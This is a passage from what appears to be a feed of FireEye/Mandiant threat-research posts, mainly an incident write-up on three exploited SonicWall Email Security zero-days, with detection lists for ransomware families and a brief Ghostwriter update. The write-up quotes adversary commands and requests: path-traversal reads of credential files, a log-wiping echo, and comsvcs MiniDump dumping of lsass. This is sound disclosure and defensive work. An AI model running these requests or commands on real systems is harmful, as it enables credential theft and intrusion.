          <li>Malware.Binary.exe</li> <li>Malware.Binary.ps1<br /> </li>
        </ul> <p>FOXGRABBER</p> <ul> <li>FE_Tool_MSIL_FOXGRABBER_1</li>
          <li>FE_Trojan_MSIL_Generic_109</li> </ul> </td> </tr>
    <tr>
      <td width="259" valign="top"><p>FireEye EndPoint Security</p>
      </td> <td width="372" valign="top"><p>Real-Time (IOC)</p> <ul>
            <li>SOMBRAT (BACKDOOR)</li> <li>SUSPICIOUS POWERSHELL READ
            BASE64 DATA (METHODOLOGY)</li> <li>FIVEHANDS RANSOMWARE
          (FAMILY)</li> <li>DEATHRANSOM RANSOMWARE (FAMILY)</li>
            <li>HELLOKITTY RANSOMWARE (FAMILY)</li> <li>BEACON
          (FAMILY)</li> </ul> <p>Malware Protection (AV/MG)</p> <ul>
              <li>SOMBRAT <ul> <li>Generic.mg. 87c78d62fd35bb25</li>
              <li>Generic.mg.6382d48fae675084</li>
              <li>Trojan.GenericKD.45750384</li>
              <li>Trojan.GenericKD.36367848</li>
              <li>Generic.PwShell.RefA.CB5E962A</li> </ul> </li>
              <li>FIVEHANDS<ul> <li>Generic.mg.39ea2394a6e6c39c</li>
              <li>Generic.mg.f568229e696c0e82</li>
              <li>Generic.mg.6c849920155f48d4</li>
              <li>Generic.mg.22d35005e926fe29</li>
              <li>Generic.mg.57824214710bc0cd</li>
              <li>Generic.mg.87c0b190e3b4ab92</li>
              <li>Generic.mg.1b0b9e4cddcbcb02</li>
              <li>Generic.mg.46ecc24ef6d20f3e</li>
              <li>Generic.mg.1a79b6d169aac719</li>
              <li>Generic.mg.a64d79eba40229ae</li>
              <li>Gen:Variant.Zusy.375932</li>
              <li>Gen:Variant.Zusy.366866</li>
              <li>Trojan.GenericKD.46059492</li>
              <li>Trojan.GenericKD.46059131</li>
              <li>Trojan.GenericKD.45996121</li>
              <li>Trojan.GenericKD.45702783</li> </ul> </li>
              <li>WARPRISM <ul> <li>Generic.mg.a01a2ba3ae9f50a5</li>
              <li>Trojan.PowerShell.Agent.IJ</li>
              <li>Trojan.Agent.EXDR</li>
              <li>Trojan.PowerShell.Ransom.E</li>
              <li>Trojan.Agent.EUKPTrojan.GenericKD.45856129</li>
              <li>Heur.BZC.PZQ.Boxter.829.B5AEB7A6</li>
              <li>Heur.BZC.PZQ.Boxter.829.B84D01A7</li>
              <li>Heur.BZC.PZQ.Boxter.829.AE76D25C</li>
              <li>Trojan.PowerShell.Ransom.F</li>
              <li>Dropped:Heur.BZC.MNT.Boxter.826.0A2B3A87</li>
              <li>Heur.BZC.PZQ.Boxter.829.A15701BD</li> </ul> </li>
              <li>DEATHRANSOM<ul> <li>Generic.mg.c50ab1df254c1855</li>
              <li>Trojan.Ransomware.GenericKD.35760206</li> </ul> </li>
              <li>HELLOKITTY<ul> <li>Generic.mg.136bd70f7aa98f52</li>
              <li>Generic.mg.06ce6cd8bde75626</li>
              <li>Generic.mg.af568e8a6060812f</li>
              <li>Generic.mg.d96adf82f061b1a6</li>
              <li>Generic.Malware.PfVPk!12.299C21F3</li>
              <li>Gen:Variant.Ransom.HelloKitty.1</li>
              <li>Generic.Malware.PfVPk!12.606CCA24</li>
              <li>Generic.Malware.PfVPk!12.1454636C</li> </ul> </li>
              <li>BEACON<ul> <li>Generic.mg.74c688a22822b2ab</li>
              <li>Generic.mg.7d6e57cbc112ebd3</li>
              <li>Trojan.Agent.DDSN</li> </ul> </li> </ul> </td> </tr></tbody></table>
 <h4>MITRE ATT&amp;CK</h4>
 <table border="0" cellspacing="0" cellpadding="0" width="624"> <tbody>
    <tr>
      <td width="150" valign="top"><p>
          <b>Tactic</b></p> </td> <td width="474" valign="top"><p>
          <b>Description</b></p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Initial Access</p> </td> <td
        width="474" valign="top"><ul> <li>T1078 Valid Accounts</li>
        </ul> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Execution</p> </td> <td
        width="474" valign="top"><ul> <li>T1047 Windows Management
          Instrumentation</li> <li>T1053.005 Scheduled Task / Job:
            Scheduled Task</li> <li>T1059.001 Command and Scripting
            Interpreter: PowerShell</li> <li>T1106 Execution through
          API</li> </ul> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Defense Evasion</p> </td> <td
        width="474" valign="top"><ul> <li>T1045 Software Packing</li>
            <li>T1055 Process Injection</li> <li>T1140 Deobfuscate /
            Decode Files or Information</li> </ul> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Discovery</p> </td> <td
        width="474" valign="top"><ul> <li>T1012 Query Registry</li>
            <li>T1046 Network Service Scanning</li> <li>T1057 Process
          Discovery</li> <li>T1082 System Information Discovery</li>
            <li>T1124 System Time Discovery</li> <li>T1135 Network Share
          Discovery</li> </ul> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Collection</p> </td> <td
        width="474" valign="top"><ul> <li>T1560.003 Archive Collected
            Data: Archive via Custom Method</li> </ul> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Impact</p> </td> <td width="474"
          valign="top"><ul> <li>T1485 Data Destruction</li> <li>T1486
            Data Encrypted for Impact</li> <li>T1490 Inhibit System
          Recovery</li> </ul> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Command and Control</p> </td> <td
        width="474" valign="top"><ul> <li>T1071.001 Application Layer
            Protocol: Web Protocols</li> <li>T1090.002 Proxy: External
          Proxy</li> <li>T1572  Protocol Tunneling</li> <li>T1573.002
            Encrypted Channel: Asymmetric Cryptography</li> </ul> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Exfiltration</p> </td> <td
        width="474" valign="top"><ul> <li>T1041 Exfiltration over C2
          Channel</li> </ul> </td> </tr></tbody></table>
 <h4>Acknowledgements</h4>
 <p>Thanks to Nick Richard for technical review, Genevieve Stark and
  Kimberly Goody for analytical contributions, and Jon Erickson,
  Jonathan Lepore, and Stephen Eckels for analysis incorporated into
  this blog post.</p>
http://www.fireeye.com/blog/threat-research/2021/04/unc2447-sombrat-and-fivehands-ransomware-sophisticated-financial-threat.html2021-04-29T21:00:00.000Z2021-04-29T21:50:12.838ZZero-Day Exploits in SonicWall Email Security Lead to Enterprise Compromisenoemail@noemail.orgJosh Fleischer<p>In March 2021, Mandiant Managed Defense identified three zero-day
  vulnerabilities in SonicWall’s Email Security (ES) product that were
  being exploited in the wild. These vulnerabilities were executed in
  conjunction to obtain administrative access and code execution on a
  SonicWall ES device. The adversary leveraged these vulnerabilities,
  with intimate knowledge of the SonicWall application, to install a
  backdoor, access files and emails, and move laterally into the victim
  organization’s network.</p>
 <p>The vulnerabilities are being tracked in the following CVEs:</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="142" valign="top"><p>CVE-2021-20021</p> </td> <td
        width="56" valign="top"><p>9.8</p> </td> <td width="426"
          valign="top"><p>Unauthorized administrative account
        creation</p> </td> </tr>
    <tr>
      <td width="142" valign="top"><p>CVE-2021-20022</p> </td> <td
        width="56" valign="top"><p>7.2</p> </td> <td width="426"
          valign="top"><p>Post-authentication arbitrary file upload</p>
      </td> </tr>
    <tr>
      <td width="142" valign="top"><p>CVE-2021-20023</p> </td> <td
        width="56" valign="top"><p>4.9</p> </td> <td width="426"
          valign="top"><p>Post-authentication arbitrary file read</p>
      </td> </tr></tbody></table>
 <p>Mandiant has been coordinating with the SonicWall Product Security
  and Incident Response Team (PSIRT) for the responsible disclosure of
  this information. SonicWall advises all customers and partners to
  upgrade to the 10.0.9.6173 Hotfix for Windows users, and the
  10.0.9.6177 Hotfix for hardware and ESXi virtual appliance users.
  SonicWall Hosted Email Security product was automatically updated for
  all customers and no additional action is required for patching
  purposes. The hotfixes will also be superseded by the upcoming
  SonicWall ES 10.0.10 release.</p>
 <p>More information can be found by visiting the <a
    href="https://www.sonicwall.com/support/product-notification/?sol_id=210416112932360">KB
  article</a> published by SonicWall.</p>
 <p>All patches, upgrades, and hotfixes are available to download on the
    <a href="https://www.mysonicwall.com/muir/login">MySonicWall site</a>.</p>
 <h4>Overview</h4>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/sonicwall/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: SonicWall Email Security
    ecosystem overview (via <a href="mysonicwall.com">SonicWall</a>)</span></p>
 <p>SonicWall Email Security (ES) is an email security solution that “<a
    href="https://www.sonicwall.com/products/secure-email/email-security-appliance/">provides
    comprehensive inbound and outbound protection, and defends against
    advanced email-borne threats such as ransomware, zero-day threats,
    spear phishing and business email compromise (BEC)</a>.” The
  solution can be deployed as a physical appliance, virtual appliance,
  software installation, or a hosted SaaS solution.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/sonicwall/fig2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: Sample SonicWall Email Security
    login page</span></p>
 <p>Like many appliances, the solution provides a rich, web-accessible
  administrative interface that serves as the main avenue for product
  configuration. Depending on the customer’s deployment method, this
  software is potentially capable of running under Windows or Unix
  because it heavily leverages OS-independent Apache Tomcat and Java.
  While the solution doesn’t require that this interface be exposed to
  the internet, internet-wide scanning shows approximately 700 publicly
  reachable interfaces.</p>
 <h4>Investigation</h4>
 <p>In March 2021, Mandiant Managed Defense identified post-exploitation
  web shell activity on an internet-accessible system within a
  customer’s environment. Managed Defense isolated the system and
  collected evidence to determine how the system was compromised.</p>
 <p>The system was quickly identified as a SonicWall Email Security (ES)
  application running on a standard Windows Server 2012 installation.
  The adversary-installed web shell was being served through the
  HTTPS-enabled Apache Tomcat web server bundled with SonicWall ES. Due
  to the web shell being served in the application’s bundled web server,
  we immediately suspected the compromise was associated with the
  SonicWall ES application itself.</p>
 <p>When we contacted the customer, we learned that the installation of
  SonicWall ES was the latest version available for download (10.0.9)
  and that there was no publicly available information pertaining to
  vulnerabilities or in-the-wild exploitation. To determine if a
  potential application-level vulnerability was exploited to install the
  web shell, Mandiant collected endpoint telemetry data.</p>
 <p>We soon identified post-exploitation activity aimed at destroying
  evidence on the system, executed in the context of the web shell. The
  adversary executed the following command, shortly after installing the
  web shell:</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>
          <span class="code">cmd.exe /c &quot;echo &quot;&quot; &gt;
            &quot;C:/Program Files
        (x86)/SonicWallES/logs/webUI/webui.json</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 3: The Adversary clearing existing
    entries in the current “webui.json” log</span></p>
 <p>This command deleted the most recent application-level log entries
  recorded by the SonicWall ES web application. While clearing log files
  is a standard anti-forensics technique, understanding the location of
  internal log files generated by applications is usually overlooked by
  most spray-and-pray attackers. This added fuel to our suspicion that
  we were dealing with an adversary who had intimate knowledge of how
  the SonicWall ES application worked.</p>
 <p>Fortunately for us, additional log files and a previously created
  virtual server snapshot provided enough evidence to track down the
  vulnerabilities and the adversary’s activities on the host.</p>
 <h4>Vulnerabilities</h4>
 <h5>CVE-2021-20021</h5>
 <p>
  <i>Unauthenticated administrative access through improperly secured
    API endpoint</i></p>
 <p>The SonicWall Email Security application contains an authenticated
  control panel to provide administration capabilities. One feature
  available allows application administrators to authorize an additional
  administrator account from a separate Microsoft Active Directory
  Organization Unit (AD OU).</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>
          <span class="code">https://&lt;SonicWall ES
            host&gt;/createou?data=&lt;XML HERE&gt;</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 4: A redacted example of the vulnerable
    endpoint associated with arbitrary user creation</span></p>
 <p>Requests to this form, however, were not verified to require
  previous authentication to the appliance.</p>
 <p>Due to this vulnerability, an adversary with a well-crafted XML
  document could either GET or POST their document to the application
  and create a “role.ouadmin” account (Figure 4). This account could
  then be used to authenticate to the application as an administrator.</p>
 <h5>CVE-2021-20022</h5>
 <p>
  <i>Arbitrary file upload through post-authenticated “branding” feature</i></p>
 <p>Like many enterprise products with a web-based user interface,
  SonicWall Email Security includes a feature known as
  &quot;branding&quot; which gives administrators the ability to
  customize and add certain assets to the interface, such as company
  logos. These branding assets are managed via packages, and new
  packages can be created by uploading ZIP archives containing custom
  text, image files, and layout settings. A lack of file validation can
  enable an adversary to upload arbitrary files, including executable
  code, such as web shells.</p>
 <p>Once uploaded, these branding package ZIP archives are normally
  expanded and saved to the <span class="code">&lt;SonicWall ES install
  path&gt;\data\branding</span> directory. However, an adversary could
  place malicious files in arbitrary locations, such as a web accessible
  Apache Tomcat directory, by crafting a ZIP archive containing a file
  within a sequence of directory traversal notations such as in Figure 5.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/sonicwall/fig5.png" alt="" />
  <br /> <span class="type-XS">Figure 5: Example ZIP archive containing
    a Zip Slip web shell</span></p>
 <p>It is important to note that the lack of validation which enables
  Zip Slip attacks is not unique to SonicWall Email Security. As
  detailed in <a
    href="https://snyk.io/research/zip-slip-vulnerability">Snyk's
    research on the topic</a>, they exist within the many code libraries
  from which applications have been built.</p>
 <h5>CVE-2021-20023</h5>
 <p>
  <i>Directory-traversal leads to arbitrary file read in
    post-authenticated &quot;branding&quot; feature</i></p>
 <p>Mandiant confirmed another post-authentication vulnerability in the
  administrative panel’s built-in &quot;branding&quot; feature which
  allowed an adversary to retrieve arbitrary files from the host by
  sending crafted HTTP GET requests to a particular resource. Figure 6
  demonstrates the formatting of such request.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>
          <span class="code">https://&lt;SonicWall ES
            host&gt;/dload_apps?action=&lt;any
        value&gt;&amp;path=..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2Fcalc.exe&amp;id=update</span></p>
      </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 6: An example web request which results
    in downloading the Windows calculator</span></p>
 <p>While the working directory of this branding feature is <span
    class="code">&lt;SonicWall ES install path&gt;\data\updates</span>,
  a directory-traversal vulnerability allows an adversary to access
  files located outside of this directory. As the Apache Tomcat
  webserver handling this request is operating as the <span
    class="code">NT AUTHORITY\SYSTEM</span> account, any file on the
  operating system can be accessed.</p>
 <p>Combinations of all three exploits were leveraged interchangeably by
  the adversary to perform the following actions:</p>
 <ol> <li>Creation of a new Administrator account on the SonicWall ES
  device</li> <li>Exposure of the hashed passwords for existing, locally
    configured Administrative accounts</li> <li>The creation of a web
    shell in an arbitrary directory</li> <li>Real-time debugging of
    exploitation success and failure</li> </ol>
 <h4>Post-Exploitation</h4>
 <p>Upon obtaining administrative access to the appliance through
  CVE-2021-20021, an adversary sent crafted HTTP requests to the
  resource <span class="code">/dload_apps</span>, a component of the
  application's &quot;branding&quot; feature, exploiting CVE-2021-20023.
  These requests leveraged directory traversal attacks, enabling access
  to two sensitive XML configuration files located at <span
    class="code">&lt;SonicWall ES install
  path&gt;\data\multi_accounts.xml</span> and <span
    class="code">&lt;SonicWall ES install
  path&gt;\data\multi_ldap.xml</span>, respectively (Figure 7).</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>
          <span class="code">GET
        /dload_apps?action=REDACTED&amp;path=..%2Fmulti_accounts.xml&amp;id=update</span></p> <p>
          <span class="code">GET
        /dload_apps?action=REDACTED&amp;path=..%2Fmulti_ldap.xml&amp;id=update</span></p>
      </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 7: HTTP GET requests exploiting CVE-2021-20023</span></p>
 <p>These files contained details about existing accounts as well as
  Active Directory credentials used by the application.</p>
 <p>Next, the adversary uploaded a ZIP archive containing the BEHINDER
  JSP web shell from the administrative panel's &quot;branding&quot;
  page. The crafted ZIP archive used a Zip Slip attack to exploit
  CVE-2021-20022, which caused the web shell to be written to the
  web-accessible Apache Tomcat directory <span
    class="code">&lt;SonicWall ES install path&gt;\Apache Software
    Foundation\Tomcat 9.0\webapps\SearchEngineRMIService\</span>.</p>
 <p>BEHINDER is a publicly available, multi-platform web shell that
  accepts encrypted command and control (C2) communications. In
  principle, BEHINDER operates similarly to <a
    href="/content/fireeye-www/en_US/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html">CHINA
  CHOPPER</a>, a popular web shell that has been previously detailed by
  FireEye. Like CHINA CHOPPER, an adversary operates a client-side
  application to pass commands to the web shell within the body of HTTP
  requests. As the core functionality of the backdoor is contained
  within the client-side application, BEHINDER—much like CHINA
  CHOPPER—has the added benefit of being small, with the variant
  observed in this investigation weighing in at less than 1 kilobyte
  (Figure 8).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/sonicwall/fig8.png" alt="" />
  <br /> <span class="type-XS">Figure 8: The BEHINDER web shell observed
    by Mandiant, which executes AES encrypted and base64 encoded commands</span></p>
 <p>With the addition of a web shell to the server, the adversary had
  unrestricted access to the command prompt, with the inherited
  permissions of the <span class="code">NT AUTHORITY\SYSTEM</span> account.</p>
 <p>After clearing the SonicWall application “<span
  class="code">webui.json</span>” log file, the adversary escalated
  their attack to credential harvesting in preparation of moving
  laterally into the victim's network. The adversary relied on “living
  off the land” techniques rather than bringing their own tools into the
  environment, which often has the benefit of potentially avoiding
  detections from a security product.</p>
 <p>We observed the adversary executing the <span class="code">reg
  save</span> command to dump the <span class="code">HKLM\SAM</span>,
    <span class="code">HKLM\SYSTEM</span>, and <span
  class="code">HKLM\SECURITY</span> registry hives, which contain vital
  information in recovering password hashes and LSA secrets.
  Additionally, the adversary obtained in-memory sensitive credentials
  through the use of built-in memory dumping techniques. The adversary
  was observed invoking the <span class="code">MiniDump</span> export of
  the Windows DLL <span class="code">comsvcs.dll</span> to dump both the
  process memory for <span class="code">lsass.exe</span> and the running
  instance of Apache Tomcat as seen in Figure 9.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>
          <span class="code">rundll32.exe
            C:\windows\system32\comsvcs.dll, MiniDump &lt;lsass PID&gt;
            c:\windows\temp\TS_LAS.dmp full</span></p> <p>
          <span class="code">rundll32.exe
            C:\windows\system32\comsvcs.dll MiniDump &lt;Tomcat PID&gt;
            C:\windows\temp\TS_FF9DG.dmp full</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 9: The adversary acquiring process memory
    for lsass.exe (MITRE ATT&amp;CK T1003.001) and Apache Tomcat</span></p>
 <p>Mandiant typically observes adversaries employing short and
  easy-to-type filenames during their operations, simply for efficiency.
  As such, the aforementioned filenames initially stood out as being
  peculiar, as a mix of case and symbols would require more effort to
  type than is often necessary. While this could always be indicative of
  a tool being used, the slight variations between the two commands—the
  absence of a comma before the DLL export and the uppercase <span
  class="code">C:\</span> drive in the second—suggest that they were
  manually typed. Considering that the <span
  class="code">C:\Windows\Temp\</span> directory on a Windows host also
  normally contains numerous similarly named temporary files, the
  adversary was likely taking extra care to evade suspicion should the
  activity reach the screen of a security analyst.</p>
 <p>Continuing their effort to live off the land as much as possible,
  the adversary located a copy of the archiving utility 7-Zip already
  present on the host and used it to compress a subdirectory of <span
    class="code">&lt;SonicWall ES install path&gt;\data\archive\</span>.
  This directory contains daily archives of emails processed by
  SonicWall ES—again demonstrating the adversary’s familiarity with the application.</p>
 <p>After a several-day lull in activity, the adversary returned to the
  host, presumably after working to recover passwords from the registry
  hives and process memory that was dumped earlier. At the time of
  activity, the victim organization was using the same local
  Administrator password across multiple hosts in their domain, which
  provided the adversary an easy opportunity to move laterally under the
  context of this account—highlighting the value of randomizing
  passwords to built-in Windows accounts on each host within a domain.</p>
 <p>We observed the adversary leveraging Impacket’s publicly available
    <a
  href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">WMIEXEC.PY</a>
  tool to access several internal hosts, which enabled remote command
  execution over Microsoft's DCOM protocol via Windows Management
  Instrumentation (WMI). The adversary managed to briefly perform
  internal reconnaissance activity prior to being isolated and removed
  from the environment.</p>
 <h4>Attribution</h4>
 <p>Mandiant currently tracks this activity as UNC2682. Ultimately,
  Mandiant prevented UNC2682 from completing their mission so their
  objectives of the attack currently remain unknown.</p>
 <p>Each investigation conducted by Mandiant includes analysts from our
  Advanced Practices team who work to correlate activity observed in the
  thousands of investigations that Mandiant responds to. At times, we do
  not have the data available to directly attribute intrusion activity
  to a previously known group. In these cases, we create a new UNC group
  to track the activity that we observed. An UNC group is a cluster of
  related cyber intrusion activity, which includes observable artifacts
  such as adversary infrastructure, tools, and tradecraft, that we are
  not yet ready to give a classification such as APT or FIN.</p>
 <p>For more details on how Mandiant uses UNC groups, see our blog post:
    <a
    href="/content/fireeye-www/en_US/blog/products-and-services/2020/12/how-mandiant-tracks-uncategorized-threat-actors.html">DebUNCing
    Attribution: How Mandiant Tracks Uncategorized Threat Actors</a>.</p>
 <h4>Investigation &amp; Monitoring Tips</h4>
 <p>Mandiant recommends monitoring of the following endpoint telemetry
  indicators for potential evidence of compromise:</p>
 <ul> <li>Child processes of the web server process “tomcat” on
    SonicWall Email Security appliances, particularly cmd.exe</li>
    <li>The creation or existence of web shells on a server hosting
    SonicWall Email Security</li> </ul>
 <p>In addition to standard indicators, Mandiant recommends reviewing
  SonicWall-related internal configuration files and logs for evidence
  of previous adversary activity.</p>
 <p>Evidence of malicious web requests and their values may be
  identifiable in the following log files:</p>
 <ol> <li>The Apache Tomcat logs:<ul> <li>C:\Program
        Files\SonicWallES\Apache Software Foundation\Tomcat
      9.0\logs</li> </ul> </li> <li>The SonicWall application logs:<ul>
        <li>C:\Program Files\SonicWallES\logs\webUI\webui.json</li>
    </ul> </li> </ol>
 <p>Evidence of unauthorized modifications to SonicWall configuration
  settings can be confirmed in the following files:</p>
 <ol> <li>The administration user account file:<ul> <li>
        <span class="code">C:\Program
      Files\SonicWallES\data\multi_accounts.xml</span></li> </ul> </li>
    <li>Additional user account files that may have been created in the
    following directories:<ul> <li>
        <span class="code">C:\Program
      Files\SonicWallES\data\perhost</span></li> <li>
        <span class="code">C:\Program
      Files\SonicWallES\data\perldap</span></li> <li>
        <span class="code">C:\Program
      Files\SonicWallES\data\perou</span></li> </ul> </li> <li>Branding
    related zip files in any of the subdirectories of the following
      directory:<ul> <li>
        <span class="code">C:\Program
      Files\SonicWallES\data\branding</span></li> </ul> </li> </ol>
 <h4>Detecting the Techniques</h4>
 <p>FireEye detects this activity across our platforms. The following
  contains specific detection names that provide an indicator of
  SonicWall ES exploitation or post-exploitation activities associated
  with this adversary.</p>
 <table border="1" cellspacing="0" cellpadding="0" width="624"> <tbody>
    <tr>
      <td width="312" valign="top"><p>
          <b>Product</b></p> </td> <td width="312" valign="top"><p>
          <b>Signature</b></p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>FireEye Endpoint Security</p>
      </td> <td width="312" valign="top"><ul> <li>RUNDLL32.EXE
            COMSVCS.DLL PROCESS MINIDUMP (METHODOLOGY)</li>
            <li>SUSPICIOUS REGISTRY EXPORTS (METHODOLOGY)</li> <li>WEB
            SERVER ECHO REDIRECT (METHODOLOGY)</li> <li>WEB SERVER
            CMD.EXE TYPE RECON (METHODOLOGY)</li> </ul> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>FireEye Network Security</p>
          <p>FireEye Email Security</p> <p>FireEye Detection On
        Demand</p> <p>FireEye Malware File Scanning</p> <p>FireEye
          Malware File Storage Scanning</p> </td> <td width="312"
          valign="top"><ul> <li>FE_PUP_Exploit_Linux_ZipSlip_1</li>
          <li>FE_Exploit_Win_ZipSlip_1</li>
          <li>FE_Trojan_ZIP_Generic_1</li>
          <li>FE_Webshell_JSP_BEHINDER_1</li>
          <li>FEC_Webshell_JSP_BEHINDER_1</li>
          <li>Webshell.JSP.BEHINDER</li>
          <li>Webshell.JSP.BEHINDER.MVX</li> </ul> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>FireEye Helix</p> </td> <td
        width="312" valign="top"><ul> <li>METHODOLOGY - LFI [Null-Byte
          URI]</li> <li>WMIEXEC UTILITY [Args]</li> <li>WINDOWS
            METHODOLOGY [Unusual Web Server Child Process]</li> </ul>
      </td> </tr></tbody></table>
 <p>Additionally, SonicWall has deployed Intrusion Prevention System
  (IPS) signatures to SonicWall firewalls to help detect and block
  attacks that attempt to leverage the aforementioned vulnerabilities.
  The following signatures have already been applied to SonicWall
  firewalls with active security subscriptions:</p>
 <ul> <li>
    <b>IPS Signature</b>: 15520 WEB-ATTACKS SonicWall Email Security
    (CVE-2021-20022 Vulnerability)</li> <li>
    <b>IPS Signature</b>: 1067 WEB-ATTACKS Web Application Directory
    Traversal Attack 7</li> <li>
    <b>IPS Signature</b>: 15509 WEB-ATTACKS Web Application Directory
    Traversal Attack 7 -c2</li> </ul>
 <h4>Mandiant Security Validation Actions</h4>
 <p>Organizations can validate their security controls using the
  following actions with <a
    href="/content/fireeye-www/en_US/mandiant/security-validation.html">Mandiant
    Security Validation</a>.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="98" valign="bottom"><p>
          <b>VID</b></p> </td> <td width="525" valign="bottom"><p>
          <b>Name</b></p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-563</p> </td> <td
        width="525" valign="bottom"><p>Malicious File Transfer -
          BEHINDER, Download, Variant #1</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-566</p> </td> <td
        width="525" valign="bottom"><p>Web Shell Activity - BEHINDER,
          Basic Shell Interaction</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-564</p> </td> <td
        width="525" valign="bottom"><p>Malicious File Transfer - Zip
          Slip, Download, EICAR Variant</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-565</p> </td> <td
        width="525" valign="bottom"><p>Phishing Email - Malicious
          Attachment, Zip Slip, Generic Themed Lure</p> </td> </tr></tbody></table>
 <h4>Vulnerability Disclosure</h4>
 <p>Mandiant disclosed the vulnerabilities CVE-2021-20021 and
  CVE-2021-20022 to SonicWall Product Security Incident Response Team
  (PSIRT) on March 26, 2021. The vulnerabilities were acknowledged and
  validated on March 29, 2021 and a hotfix became available on April 9,
  2021. The patch was communicated to impacted SonicWall customers and
  partners on April 9, 2021.<br />  <br /> Mandiant disclosed the
  vulnerability CVE-2021-20023 to SonicWall PSIRT on April 6, 2021. The
  vulnerability was acknowledged and validated on April 9, 2021 and a
  patch became available April 19.</p>
 <p>To mitigate the three CVEs, Mandiant and SonicWall recommend
  upgrading Email Security to version 10.0.9.6173 (Windows) or
  10.0.9.6177 (Hardware &amp; ESXi Virtual Appliances). Organizations
  using SonicWall Hosted Email Security (HES) products were
  automatically updated and no action is required for those customers.</p>
 <h4>Acknowledgements</h4>
 <p>SonicWall PSIRT, Charles Carmakal, Ben Fedore, Geoff Ackerman and
  Andrew Thompson.</p>
http://www.fireeye.com/blog/threat-research/2021/04/zero-day-exploits-in-sonicwall-email-security-lead-to-compromise.html2021-04-20T21:00:00.000Z2021-04-28T20:21:42.681ZGhostwriter Update: Cyber Espionage Group UNC1151 Likely Conducts
Ghostwriter Influence Activitynoemail@noemail.orgLee Foster<p>In July 2020, <a
    href="/content/fireeye-www/en_US/mandiant/advantage.html">Mandiant
    Threat Intelligence</a> released <a
    href="/content/fireeye-www/en_US/blog/threat-research/2020/07/ghostwriter-influence-campaign.html">a
    public report</a> detailing an ongoing influence campaign we named
  “Ghostwriter.” Ghostwriter is a cyber-enabled influence campaign which
  primarily targets audiences in Lithuania, Latvia and Poland and
  promotes narratives critical of the North Atlantic Treaty
  Organization’s (NATO) presence in Eastern Europe. Since releasing our
  public report, we have continued to investigate and report on
  Ghostwriter activity to Mandiant Intelligence customers. We tracked
  new incidents as they happened and identified activity extending back
  years before we formally identified the campaign in 2020. A new report
  by our Information Operations analysis, Cyber Espionage analysis, and
  Mandiant Research teams provides an <a
    href="https://content.fireeye.com/web-assets/rpt-unc1151-ghostwriter-update">update
    on Ghostwriter</a>, highlighting two significant developments.</p>
 <p>We have observed an expansion of narratives, targeting and TTPs
  associated with Ghostwriter activity since we released our July 2020
  report. For example, several recent operations have heavily leveraged
  the compromised social media accounts of Polish officials on the
  political right to publish content seemingly intended to create
  domestic political disruption in Poland rather than foment distrust of
  NATO. These operations, conducted in Polish and English, appear to
  have largely not relied on the dissemination vectors we have typically
  observed with previous Ghostwriter activity, such as website
  compromises, spoofed emails or posts from inauthentic personas. We
  have observed no evidence that these social media platforms were
  themselves in any way compromised, and instead believe account
  credentials were obtained using the compromised email accounts of
  targeted individuals.</p>
 <p>Recently obtained technical evidence now allows us to assess with
  high confidence that UNC1151, a suspected state-sponsored cyber
  espionage actor that engages in credential harvesting and malware
  campaigns, conducts at least some components of Ghostwriter influence
  activity; current intelligence gaps, including gaps pertaining to
  website compromises and the operation of false personas, do not allow
  us to conclusively attribute all aspects of the Ghostwriter campaign
  to UNC1151 at this time. We do not associate UNC1151 with any other
  previously tracked threat groups. Since the start of 2021, UNC1151 has
  expanded its credential theft activity to target German politicians.
  This targeting has been publicly reported in the German <a href="https://www.tagesschau.de/investigativ/wdr/hackerangriffe-105.html">Tagesschau</a>.</p>
 <p>The appendices of the report include an exhaustive table of
  incidents and operations we currently associate with Ghostwriter
  activity, a detailed case study of a recent Ghostwriter operation, and
  indicators of compromise (IOCs) related to UNC1151.</p>
 <p>Read <a
    href="https://content.fireeye.com/web-assets/rpt-unc1151-ghostwriter-update">the
    report today</a> to learn more.</p>
